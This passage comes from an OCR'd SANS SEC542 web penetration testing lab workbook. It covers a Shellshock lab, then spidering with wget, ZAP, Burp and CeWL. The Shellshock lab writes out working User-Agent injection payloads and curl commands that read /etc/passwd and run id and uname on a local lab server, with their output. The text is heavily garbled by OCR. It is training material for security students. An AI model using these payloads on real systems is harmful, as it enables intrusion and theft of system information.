display the contents of/ etc/passwd 
The current User-Agent string below shows: Mozilla/5.0 (Xll; Ubuntu; Linux i686; rv:34.0) 
Gecko/20100101 Firefox/34.0 
GET /cgi-bin/netstat.cgi HTTP/1.l 
!• 
Host: ,,.11,tw. sec542. org 
Jie.r~~Ag11~fiJ'llzil!ai~.:.Eftx~.1;-~uMt9.;·idnux.i685f'5':1a'4.eJ)3,elot2BlGOl&l.F!re:lfor~94.G 
Accept; text/html,application/xhtl'Sll+xml,application/xml;q=8.9,*/*;q=0.8 
Accept-Language= en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: keep-alive 
cache-Control: max-age=O 
Change the User-Agent 
Now change the User-Agent to: 
User-Agent: 
() 
{ 42;};echo;/bin/cat /etc/passwd 
ttt 
t 
Oma!'.thes 
The spaces are mandatory. There are four single spaces in the example, indicated with arrows. The value 
42 is arbitrary and can be any alphanumeric string of one character or longer. 
Note: The syntax can also be copied and pasted from the shell shock. txt file on the Desktop. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
,.__,,, 
,.__,,, 
,.__,,, 
"--' 
,.__,,, 
'-' 
'-' 
'-' 
'-' 
'-' 
'-'. 
'-' 
'--' 
'--' 
'-' 
'-' 
'-' 
,.__,,,. 
,.__,,, 
'-J 
,.__,,, 
'-../ 
'--' 
'-' 
'-' 
'-' 
,.__,,, 
'-' 
'-../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
.'-../ 
6 
'-' 
'-' 
'-' 
Your forged User-Agent should now look like the following screenshot: 
GET /cgi, bin/netstat. cgi HTTP/I. l 
Host: W'ltlw.sec542.org 
Llse I"· ~eri:t : .1LJ .!42; l; jrc_~ .a ;.~bij1,;~at 1 et~/P.~~s-~ 
Accept: text/html, application/xhtml+xml, application/xml;q=O. 9, "''/*;q=O. a 
Accept· Language: en- us, en; q=O. 5 
Accept.Encoding: gzip, deflate 
Connection: keep· alive 
Cache-Control: max-age=O 
,,, I etc/passwd Displayed in the Browser 
,,-, 
Now turn Burp intercept off by clicking the button so that it shows: 
l 
Intercept is. aff ) 
The edited request will be sent to the web server. 
Go back to the Firefox window: 
,, 
You should now see the password file if you performed the previous steps correctly. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
7 
root:x :8:e: root: /root: /bin/bash 
~:x:1:1:daeaon:/usr/sbin:/usr/sbin/no\ogin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dtN:/usr/sbin/noloOi,n 
sync:x:4:65534:sync:/bin:/bin/sync 
~s:x:5:69:gaes:/usr/g,aes:/usr/sbWno\ogin 
111SR:x:6:12:En:/v1r/c&ehe/mlltn:/usr/sbWnoto0in 
lp:x:7:7:1.p:/var/spool/l.pd:/usr/sbin/nolootn 
llillil:x:8:8:uil.:/var/uil:/usr/sbin/no\ogin 
news:x:9:9:news:/var/spoo\/news:/mr/sbin/nologin 
uucp:x:18:18:uucp:/var/spooVwcp:/usr/sbin/no\ogin 
proxy:x:13:13:pro:xy:/bin:/usr/sbin/nologin 
WIIIW-data:x:33:33:www-data:/var/vww:/usr/sbin/mlogin 
...., 
backup:x:34:34:backup:/var/baclwps~/usr/sbin/rw:,login 
list:x:38:38:ttailing List Man1ger:/'lllr/\ist:/usr/sbin/nologin 
ire :x: 39: '9: ired :/var/run/ircd:/usr/sbin/no\ogin 
gnats:x:41:41:Gnats Bog-AeporU.ng Systa (adliin) :/var 
/Ub/gnats:/usr/sbin/nol4gin 
nobody:x:65534:65534:nobody:/none:dstent:/usr/sbio/no\ogin 
libooid ;x: 188: 181: :/var/Ub/Ubwid: 
sys\og:x:lel:lM::/hcae/syslog:/bin/false 
lll!!ssagebus:x:182:186::/var/run/dbUs:/bWfatse 
usballc:x:193:46:usbalx daemon,,, :/~/ust:o:t.ux:/bin/false 
dnS1111sq:x:lQ4:65534:dn511111sq,,, :/var/Ub/rnisc:/bin/fatse 
avahi-autoipd: x: 18S: 113: A¥ahi ai.rtoip daemon, , , : /Var 
/lib/avahi-autoipd:/bin/false 
kerAOOps: x: 186 :65534: Kernel Oops Tracking Daert10n, , , : /: 
/bin/false 
If not, recheck your work; go back to the Set Burp Intercept step and try again. 
Let's Run /usr /bin/ id 
Let's check the permissions of the web server user. 
Repeat the previous steps (see previous slides for step-by-step instructions). 
• 
Turn Burp intercept on. 
• 
Reload the netstat.cgi page in Firefox. 
• 
Change the User-Agent: 
User-Agent: 
() 
{ 42;};echo;/usr/bin/id 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
'--' 
'--' 
'--' 
'--' 
\.J 
'--' 
'-..../ 
'-..../ 
'-..../ 
\.J 
'-..../ 
'--' 
'-..../ 
'-..../ 
'-..../ 
'--' 
'--' 
'-..../ 
'-..../ 
''-..../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
\.J 
'-..../ 
'--' 
'--' 
'-..../ 
'-..../ 
'-..../ 
8 
'--' 
'-..../ 
'--' 
• 
Turn Burp intercept off. 
- + 
~ WW'N,Se<:542.org/cgi-bm/nets 'C9 • C? I )) ' - - - 
Note: The syntax for this User-Agent is also in the Desktop shellshock.txt file and can be cut and pasted. 
------ 
/etc/passwd via curl 
The curl command-line browser can alter the User-Agent, the syntax is: 
l $ curl -A "<User-Agen;>I' <URL> 
;·, 5' 
Open a terminal and type this command: 
$curl-A 
11() 
{ 42;};echo;/bin/cat /etc/passwd" http://127.0.0.1/cgi- 
bip./netstat.bgi 
Note: The command above would be entered on a single line, as indicated by the single$ prompt. 
Executing the command results in the following: 
View T"'"'""'"n"1 
Tabs: 
[-]$ curl ·A "O { 42;};echo;/bintcat /etc/passwd" http:/1127.8.8.l/cgi-bin/netstat.cgi 
root:x::9:8:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usrtsbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games: x: 5: fi.0: games: /usr /games: /us r /sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
X 
Note: The syntax for this command is also in the Desktop shellshock.txt file and can be cut and pasted. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
9 
/usr /bin/ id via curl 
'-' 
Up-arrow the previous curl command, and replace "/bin/cat /etc/passwd" with "/usr/bin/id": 
$curl-A 
11() 
{ 42;};echo;/usr/bin/id11 http://127.0.0.1/cgi- 
bin/ne'l::.stat.cgi 
·. 
Note: The command above would be entered on a single line, as indicated by the single $ prompt. 
The command and its output should look like the following: 
X 
[-J:$ curl -A "() { 42;};echo;/usr/bin/id" http://127.0.0 .. 1/cgi-bin/netstat.cgi 
uid=33 (www-data) gid:33 (\-MW-data) g roups=33 {www-data) 
I-U I 
/bin/uname via curl 
Now, let's display the kernel version on the system, which could allow us to identify a potential local 
privilege escalation flaw. 
Up-arrow the previous curl command, and replace /usr /bin/ id with /bin/uname -a: 
$curl-A 
11() 
{ 42;};echo;/bin/uname -a
11 http://127.0.0.1/cgi- 
bin/netstat.cgi 
Note: The command above would be entered on a single line, as indicated by the single$ prompt. 
The command and its output should look like the following: 
T 
m,l 
- + 
;;,/; 
"ermfnai 
Tabs 
-=- -=·=··--- 
[-}$curl-A ·c) { 42;};echo;/bin/uname -aR http://127.0.0.l/cgi-bin/netstat.cgi 
Linux Security542 3.13.0-108-generic #155-Ubuntu SMP Wed Jan 11 16:57:06 UTC 201 
7 1686 1686 i686 GNU/Linux 
r-rs I 
Feel free to try other commands, but note you must provide the full path to the binary to be executed. 
What about maximum pwnage with shell access?!?! Great minds think alike: We will gain shell access via 
Shellshock during a 542.5 exercise. 
'-..,/ 
'-..,/ 
'-' 
'-' 
'-' 
'-..,/ 
'-..,/ 
\._, 
'-..,/ 
\.J 
'-../ 
\._, 
'-..,/ 
'-../ 
\._, 
'-' 
'-..,/ 
'-..,/ 
'---' 
'---' 
'-../ 
'-" 
'-" 
'-- 
'---' 
'-'' 
'-../ 
'-../ 
'-..,/ 
'-../ 
'-..,/ 
'---' 
\._, 
\._, 
'--' 
\._,; 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
10 
\._,; 
'-' 
'-' 
Final Step 
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
542,.1 
eb Authentication 
eb Authentication - Forms 
v" Burp 
Rat Proxy 
Zap 
Ensure No Proxy is set when complete. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
11 
·. ••·. •• 
.· 
'Ex er;.@J~,e Z.3 :-c ~eb ~NAiiJ.e ni nY, = 
< 
· ':, > 
- =----~ 
- 
~---:~::- 
~ 
::., -.: -:.. 
- ~ 
~ 
~ - 
- 
< 
- ;;; - 
' 
' 
_----= - < 
,---...._ 
I Objectives 
• 
Gain experience spidering web applications 
• 
Work with wget, ZAP, Burp Suite, and CeWL 
• 
Build a wordlist from a web page 
• 
Discover accessible and linked application entry points 
,---...._ 
I Chall~nge: No Hints 
,---...._ 
Perform the following tasks: 
wget 
• 
Use wget to recursively spider http://www. sec542. org and store the results in / tmp 
• 
Compare the results from wget with the files and folders of the actual site, located in 
/var/www/html 
,---...._ 
ZAP 
• 
Configure Firefox to use ZAP as its proxy 
• 
Recursively spider http://www. sec542. org using ZAP 
• 
Explore results 
Burp Suite 
• 
Configure Firefox to use Burp as its proxy 
• 
Recursively spider http://www. sec542. org using Burp 
• 
Explore results 
CeWL 
• 
Use CeWL (located at /opt/ cewl/ cewl. rb) to crawl http://www. sec542. org and create a 
word list 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
1 
lstep-by-siepinstructions 
Running Wget 
'-./ 
'---' 
Wget is a useful command-line utility that can download data via http, https, and ftp. This spider function 
is one of its most useful features. 
Open a terminal and spider the site: 
$ wget -r http://www.sec542.org -P /tmp 
The following screenshot shows the command being run and the initial output: 
ii( 
f-}$ wget -r www.sec542.org -P /tmp 
--2815-81-84 87:52:36-- 
http://W'v1W.sec542.org/ 
Resolving ~.sec542.org (www.sec542.org) •.. 121.0,.e.1 
Connecting to www. sec542. org (www. sec542. orq) I 127. a. e. l I : 80.. . connected. 
HTTP request sent, awaiting response ..• 289 OK 
Length: 1153 ( 1. 1K) [ text/html 1 
saving to: 
'/tmp/W'vlW.sec542.org/index.html' 
188% [ =--- - 
- 
==-'-=--==>] 1, 153 
··.*K/s 
in as 
2815-81-84 87: 5,2: 36 ( 233 MB/s) • 
'/tmp/W'vlW. sec542 .. orgJindex .. html' saved [ 
531 
Note: This recursively spiders the website (-r flag) and saves the results to /tmp/www. sec542. org (- 
P /tmp option). Please use an uppercase "P". 
Then visually inspect the remote spider results now stored in /tmp/www. sec542. org with the real site 
located at /var/www/html: 
Type the following command to see the spider results at a high level: 
'---' 
'---' 
'-- 
'---' 
'-...,/ 
'---' 
'---' 
'---' 
. .____, 
.____, 
.____, 
'-' 
'---' 
'---' 
'---' 
'--' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-" 
'-...,/ 
'---' 
'-" 
'---' 
[ $ ls /t:.mp/www.sec542.org 
'---' 
'-./ 
'---' 
The command and output should look like the following: 
'-...,/ 
'---' 
'---' 
'---' 
'-' 
'-._.,, 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
2 
'---' 
'-' 
'-._.,, 
[-]$ ls 
base 
bsqli. php 
dns 
exercisel.html 
i-1$ C 
/tmp/Wrtw. sec542. o rg 
form auth 
guide 
images 
index.html 
phpbb 
robots.txt 
sans.gif 
snake 
sqli.php 
userenum 
webcalendar 
wordpress 
Type the following command to see the actual contents at a high level: 
www/htm 
The command and output should look like the following: 
[-]$ ls 
base 
basic 
book.php 
bsqli2.php 
bsqli.php 
bunny.html 
cancan.mp3 
cookiecatcher.php 
digest 
dns 
earth. j pg 
exercisel.html 
[-]$ ~ 
exercises 
favicon.ico 
form-au th 
guide 
images 
index.html 
phpbb 
phpinfo.php 
PhpMyAd11in 
pwn 
python 
robots.txt 
userenum 
webcalendar 
wordpress 
wordpress-471 
\1,1·w1.,,. sans. org 
Notice how many files and directories the spider missed that exist on the actual site. 
While not formally part of the lab, you could also use the following command for a more detailed listing of 
differences between the folders: 
$ diff -q /varJwww/html ,ltmp/www.sec542. 
Note: To see even more detail about the subdirectory differences add a (-r) switch to the previous 
command: 
$ diff 
.sec542.org 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
3 
Running ZAP 
'--' 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
,_____, 
'--" 
'--" 
'---' 
'---' 
'---' 
'-" 
'-" 
'-" 
'-" 
'---' 
'---' 
Note: ZAP takes a while to launch, roughly ten seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
.,,. 
'
C 
•, 
• 
cannot listen on port loealhost:8081 
In this case, close the additional ZAP instances, leaving the original. 
Warning: When in doubt, close all ZAP instances and start over. ZAP must be listening on port 8081 for this 
lab to work. 
'-" 
'-" 
'-" 
'--' 
'-" 
'-" 
'---' 
'---' 
\.J 
'-" 
'-" 
'-" 
'-" 
'-,J 
\.J 
'-" 
\.J 
'-" 
'-" 
'-" 
'-" 
'-,J 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
4 
'-" 
'-../ 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
Configure Firefox to use the running proxy: 
In Firefox: Select ZAP from the Proxy Selector drop-down. 
SANS Security 542 - Web 
Ethical Hae 
B
IHTTPR~~d Res 
Heartbieed 
Auto-detect 
system Proxy 
Burp 
' 
Snake 
i/Shellshock - netstat.cgi 
I ii Manage Proxies 
i[Web A1.!!~e11~~atiClI1- BasicJ freferences 
: Web Authentication - Digest 
Ensure ZAP is now chosen as the proxy. 
We have already installed a Firefox extension called Proxy Selector and configured it with appropriate 
settings for the student VM. This enables you to quickly switch proxies being used by Firefox. In this case, 
we have already configured proxy settings and saved them under the name ZAP. To activate the use of 
ZAP, simply select ZAP from the proxy list on the right side of the proxy bar at the top of the Firefox 
window. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
5 
'---' 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
proxy. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
In ZAP, right-click http:/ /www.sec542.org in the site selection box. 
Default Context 
,.. 8 Sites 
Welcome to the OWASP Zed Attack Pr 
ZAP is an easy to use integrated penetration testing tool for finding vulnerabilitiesJ 
Please be aware that you should only attack epplicatiens that you have been spec! 
uickly test an application, enter its URL below and press 'Attack'. 
Progress: 
Not started 
For a more in depth test you should explore your application using your browser o 
Explore your application: 
[ Launch Browser j [chrome j]ir] 
~,History l E\ Search l •lfll Alerts 
.. 
Note: If http://www. sec542. org is missing under sites, click the reload button in Firefox to have the 
page load again try to load through ZAP. 
'---' 
'--' 
...___, 
'--- 
...___, 
.__,, 
--.J 
'--' 
.__,, 
--.J 
'-- 
'--- 
"-- 
--.J 
. .___, 
'-"' 
'-..., 
'--' 
'----' 
'-"' 
'-"' 
'-"' 
'-"' 
'-"' 
'-"' 
fEtsting 
MOZUII Firefox 
'-"' 
'-"' 
4 
MutUlldae 7iPbWAPP EDVWA 
After right-clicking on http://www. sec542. org, choose Attack. 
...___,, 
...___,, 
'-..., 
'----' 
'-"' 
'-J 
'-" 
'--' 
'-"' 
'-"' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
6 
'----' 
'----' 
'--' 
Quick Start 1i' · ""i' Request 
Response;;:::, + 
Run application 
Exclude from Context 
Open/Resend with Request Editor ... 
Exctude from 
Open URL in Browser 
Show in History Tab 
Open URL in System Browser 
Copy URLs to Clipboard 
Delete 
Manage Tags ... 
Export All URLs to File ... 
Export Selected URLs to File ... 
Break ... 
New Alert ... 
~ Spider ... 
~ Active Scan ... 
Forced Browse site 
Forced Browse directory 
Forced Browse directory {and children) 
~ AJAX Spider ... 
G Fuzz ... 
k 
I 
. 
ii" 
P>1-----------------~ 
est you should explore your application using your brows 
ion: [ Launch Browser ] [ Chrome ITT"'] 
Reason 
Welcome to the OWASP Zed Attack 
ZAP is an easy to use integrated penetration testing tool for finding 
Please be aware that you should only attack applications that you have been 
.. I Highest.. i N... Tags 
Then choose Spider ... 
Flag as Context 
Run application 
Exclude from Context 
Open/Resend with Request Editor ... 
Exclude from 
Open URL in Browser 
Show in History Tab 
Open URL in System Browser 
Copy URLs to Clipboard 
Delete 
Manage Tags ... 
Sea 
Export All URLs to File ... 
r Forced Browse site 
)- Forced Browse directory 
}" Forced Browse directory (and children) 
~ AJAX Spider ... 
"" V Fuzz ... 
"'!-----------------~ 
est you should explore your application using your brows 
ion: [ Launch Browser ] [ Chrome ~ Tj 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
7 
On the next menu, choose Start Scan. 
'-' 
+ 
X 
http:/M'llw.sec542.org 
I Qi. Sele<t • ., .l 
Coote!<!: 
Usen 
!letutse: 
~· 
Spider Subtree Only 
w 
As seen in the following output, a new Spider tab will be added to the bottom and will show the progress 
and some results of the spidering process: 
L] rlJ (") GET:basic 
!Ill~ GET:bsqli.php 
fl!(") GET:bsqli.php(name) 
GET http,;;.......,...,.sec542.org/ HTTP/1.1 
User-Agent: Mozilla/5.0 (Xll; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0 
Accept: text/html,application/xhtm1+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Connection: keep·alive 
Upgrade-Insecure-Requests: 1 
Cache-Control: max-age=O 
Host: w-w.sec542.org 
Added Nodes I Messages 
~lcurrent Scans: o 
URLs Found: 298 
Nodes Added: 150 ·I t EKport 
1 
Processed 
Method 
I URI 
i Hags 
j~! 
Q 
GET 
http:/Jwww.sec542.org/ 
Seed 
r• j 
GET 
http:Jtwww. sec 542. org!robots. txt 
Seed 
'"".J 
GET 
http:f/WWW. sec542. org/sitemap.xml 
Seed 
'[··· .. /.· 
GET 
http:/Jwww.sec542.org 
Seed 
' 
GET 
http://WWW.sec542.org/cgi-bin/ 
GET 
http://WWW.sec542.org/admin 
: 
http://',yww.sec542 .. org,'cgi-bin/netstat.c i 
_ 
... 
1·• 1 
current scar1s·'e-,r ,tf 9. Zfo-· ~-Q _;.~}¥ Q ~ o 
Q 
Newly identified paths and resources will be visible in the Sites tab after expanding 
http://www.sec542.org. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
'-./ 
'-' 
'-..,, · 
'-./ 
'-./ 
'-./ 
'-..,, 
'-..,, 
\,,_,I 
'-./ 
'--' 
'-./ 
\,,_,I 
'-' 
'-' 
..__,, 
'-..,, 
'-' 
'-./ 
'-./ 
'-' 
'-' 
'-' 
'-' 
'-./ 
'-' 
'-' 
..__,, 
'-' 
..__,, 
'-' 
..__,, 
'-./ 
'-./ 
'-' 
'--" 
8 
'-..,, ' 
'..J 
'-./ 
Running Burp 
Launch Burp by clicking the Burp icon in the upper panel: 
Wait for Burp to launch. 
Run one instance of Burp only. Multiple instances of Burp are running if you see this warning: 
Yo1 .. 1r temporary directory contains the !oli'owing folders which appear to have been previously generated by Surp, Would you like to delete these? 
Note: you should not delete these flies if another instance oi Burp is currently running, 
Wedjan 17 08:26:35 PST 20Hl /tmpJburp76441616l3305329404.tmp 
Wed Jan 17 OS:26:35 PST 2018 /tmpiburp1A5Sl 18343269-081906,tmp 
Wed Jan 17 OS:26:35 PST 2018 
/tmp/burp3975632966637475085.tmp 
In this case, choose Leave and then close the newest Burp instance, leaving the original. When in doubt, 
close all Burp instances and start over. 
Warning: Burp must be listening on port 8082, and the Burp instance that generates the preceding error 
r--. 
cannot bind to port 8082 because it is in use by another instance. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
9 
Then choose Burp in the Firefox Proxy Selector menu: 
\.../ 
and Ethical Haddng · Mozilla Fir~fox 
=--~--=~~~- 
- + 
X 
\.,..I 
'-../ 
vvvvit1.sec542.or. 
'-.../ 
:;,ffJi:y,:,7Tii::i,._,.. f 1v1u1,11num: 
bWAPP IIJDVWAj v' No 
Auto-detect 
II 
SANS Security 542 - Web Pe~ 
Ql!m 
Ethical.~ 
1 
1 
[~~~~il=leed 
_J 
IShellshock - netstat.cgi 
l ~ Manage Proxies 
IIWeb Authentication - BasiG j '"
_-' _ _ 
_f 
_ 
_ 
_ 
i 
• ~ Pre erences 
f 
Web Authentication - Digest'-~-:;:,·-·-··--·-.-,,,,,, -- 
- , 
'-../ 
'-.../ 
'-../ 
'-.../ 
'-../ 
'-.../ 
'-.../ 
'-.,/ 
Refresh the page in Firefox to prime Burp: 
'-.../ 
WW\lV.sec:542.orgl 
- 
v 
Mutlllldae 
rlJDWIA. 
'-' 
'-' 
'-.../ 
'-../ 
In Burp, select the Spider tab. Burp could automatically begin spidering. If not: Click the "Spider is Paused" 
button so that it changes to "Spider is Running". 
'-../ 
'-' 
'-" 
Sequencer 
Decoder 
Target 
Proxy I 
Sprd 
Options 
Alerts 
der 
Repeater 
Options 
Spider 
Use these settings to monitor and control Burp Spider. To begin spidering, 
browse to the target application, then right-dick one or more nodes in the 
target site map, and choose "Spider this host/ branch". 
Spider is paused 
Requests made: 
O 
Bytes transferred: 0 
Requests queued: 2 
Forms queued: 
O 
Spider Scope 
® Use suite scope [defined in Target tab] 
Use custom scope 
'-.,/ 
'-' 
'-" 
'-../ 
'-" 
'-' 
'-" 
'-" 
'-.,./ 
'-' 
'-../ 
'-.../ 
'-" 
'-.,/ 
'-' 
'-' 
'-" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
10 
'-" 
'-.,/ 
Once spidering has begun, details about the number of requests made and bytes transferred will indicate 
that Burp has sent data. The Requests and Forms queued counters will indicate items that Burp is aware 
of, but due to time or configuration has not yet sent to the target. 
Burp Intruder Repeater Window Help 
Intruder 
Spider Status 
Use these settings to monitor and control Burp Spider. To begin spidering, 
browse to the target application, then right-click one or more nodes in the 
target site map, and choose "Spider this host/ branch". 
[< c1earqueues 
Requests made: 
1,426 
Bytes transferred: 
11,296,637 
Requests queued: 393 
Forms queued: 
o 
Even while the spidering process is ongoing, current details can be reviewed in the Target tab. 
Note: Even though the following screenshot shows O "Requests queued" notice that the button still 
suggests "Spider is running". If you were to continue using the web browser pointed at Burp, any newly 
identified and in-scope paths would be automatically spidered too. 
Burp Intruder Repeater Window Help 
Extender 
Options 
Scanner 
Intruder 
Repeater 
[1.J Spider Status 
Use these settings to monitor and control Burp Spider. To begin spidering, 
browse to the target application, then right-click one or more nodes in the 
target site map, and choose "Spider this host/ branch". 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
11 
Examine Results in Burp 
Select the Target tab in the interface to display the results: 
'--" 
"---" 
'--" 
- 
I Prq>-"y' J Spiderj scanner \ intruder I RepeaterJ Sequencer I Decoder I. comparer t Extender L OptionsJ Alerts I 
I 
found items; 
http://127 .0.0.1 :3000 
http://drupal 
http://dvwa 
https ://heart.bleed 
http://localhost 
https ://localhost 
http://localhost. 
http ://mutillidae 
" 
"fl;] https://www.sec542.org 
hiding 4xx responses; 
Host: www. sec542. org 
User-/l,gent: Mozi Ha/5. o (xi i: Linux i686; rv : 50. O) Gecko/20100101 
Fi refox/50. O 
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;o=0.5 
2 
o matches 
'---,/ 
As you can see, it displays a chart of resources found as well as various pieces of information regarding 
each of them. Selecting an item fills in the boxes to the right. The top displays all the files that link to this 
resource. The bottom can show both the raw request and the response, as well as a hex view and a render 
view (only available for responses). 
Note that the 401s are not normally visible unless you click the filter options at the top of the screen and 
check the box to display. 
'-' 
'-' 
'-../ 
'-' 
'-' 
'-._,I 
'---,/ 
'-' 
'-../ 
'-' 
'-../ 
'-' 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-' 
'-../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
12 
'--" 
'-' 
'-../ 
Expanding the tree for http://www. sec542. org shows both items already fetched as well as some 
items not retrieved: 
., 
dns 
D exercisel.html 
> 
form_auth 
> 
guide 
., 
irnaqes 
I> 
phpbb 
D robots .. txt 
D sensitive 
.,. 
sensitive 
> 
snake 
sqli.php 
The light gray font indicates Burp being aware of the resource, but not having yet retrieved the resource. 
Why would this be the case? 
Clicking on the light gray "admin" folder shows no HTTP Requests or Responses: 
Scanner 
Intruder 
Repeater 
. Sequencer 
Decoder 
Comparer 
Extender 
Options 
1 Alerts 
i• 
Host 
I Method l UR.L 
D exercise l .html 
Recall previously that we stated that 401s are not normally visible due to default filtering. That is also true 
of 404s. Browsing to http://www. sec542. org/admin will make clear this yields to a HTTP 404: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
13 
404 Not Found 
X 
+ 
e e 
Burp• >> - 
-- 
Not Found 
The requested URL /admin was not found on this server. 
A.pache/2A 
.. 7 (Ubuniu) Server at \>VWw.sec542.org Port 80 
If you have time, check out the other features of Burp and enjoy the tools! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
'--' 
.'-" 
'-" 
'-.../ 
'-.../ 
'-" 
'-" 
'-" 
'-" 
'-" 
..___, 
'-" 
'-.../ 
..___, 
'-" 
'----- 
'-" 
'-.../ 
'----- 
.___., 
'-" 
\....,, 
'-" 
..___, 
'---' 
'-.../ 
'-" 
'-.../ 
'-" 
'-.../ 
'-.../ 
'---' 
'-.../ 
'-..., 
'-" 
'-" 
'-.../ 
'-" 
'-" 
14 
'-..., 
. .___., 
'-.../ 
Running CeWL 
We will now use CeWL to spider http://www. sec542. org and create a list of unique words used on 
the site. 
" 
Launch a terminal, then change to the CeWL directory and run CeWL: 
$ cd /opt/cewl 
[/opt/cew1]$ ./cewL 
CeWl 5,2 (Some Chaos) 
the 
you 
Forum 
http://www.sec542.org 
R.obin Wood (robin@digi.ninja) (https://digi.ninjal) 
" 
You can also write the results to a file by adding -w -/ cewl _ wordlist 
This creates a wordlist for use in password attacks. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
15 
Final Step 
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
SANS Security 542 - Web 
I 
Ethical Hacki 
B
l!:!TIP Requests and Res:i:t< 
IHearthleed 
- 
·---- 
Snake 
..... ,,.- 
... --~--······--··«-·····--······ 
Shellshock - netstat:cgl 
Rat 
~W~e~b~A~~u~th~e~n~tl~· c~a~t~1o~n~- ~B~a~si~c~ {oJ nr=+=r,,~~=r 
Web Authentication - Dig:est · ·~ 
· 
· · ~~~---11 
Ensure No Proxy is set when complete. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.3: Web Spidering 
. .._,, 
'---' 
'-' 
'-" 
'-" 
\..../ 
'-" 
'-" 
'-" 
.._,, 
'-" 
'-" 
'-" 
\..../ 
'-" 
'-" 
'-" 
'-" 
\..../ 
'-" 
'-" 
'-" 
.._,, 
\..../ 
'-" 
\..../ 
'-" 
'-" 
'-" 
'-" 
\..../ 
\..../ 
'-" 
\..../ 
'-" 
'-" 
'-" 
'-' 
'-" 
16 
'-J 
'-J 
.._,, 
"' 
jobjectives 
• 
Build upon hosts found via DNS brute forcing 
• 
Discover unlinked content in applications 
• 
Gain hands-on experience with ZAP's Forced Browse 
• 
Understand how forced browsing complements crawling/spidering 
Lab Setup 
"' 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
Note: ZAP takes a while to launch, roughly 10 seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
In this case, close the additional ZAP instances, leaving the original. When in doubt, close all ZAP instances 
and start over. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
1 
Warning: ZAP must be listening on port 8081 for this lab to work. 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
Configure Firefox to use the running proxy: 
In Firefox, select ZAP from the Proxy Selector drop-down: 
Autcnietect 
' 
SANS Security 542 - Web Pe~ 
Ethical Hackin 
\...,, 
~ 
,J 
Ensure ZAP is now chosen as the proxy. 
V 
We have already installed a Firefox extension called Proxy Selector. This enables you to quickly switch 
Firefox between various proxy servers. In this case, we have already configured proxy settings and saved 
them under the name ZAP. To activate the use of ZAP, simply select ZAP from the proxy list on the right 
side of the proxy bar at the top of the Firefox window. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
\...,, 
'-..../ 
'-..../ 
'-..../ 
'--" 
'--" 
'-' 
'-..../ 
'-..../ 
'--" 
'---' 
'--" 
\_,, 
'---' 
'-..../ 
'---' 
'---' 
'---' 
.'--" 
'---' 
'-..../ 
'-,/ 
'----,I 
'----,I 
'-' 
'-..../ 
'--' 
'--" 
'-,/ 
'---' 
'--" 
'---' 
'-,/ 
'-..../ 
'-..../ 
'--' 
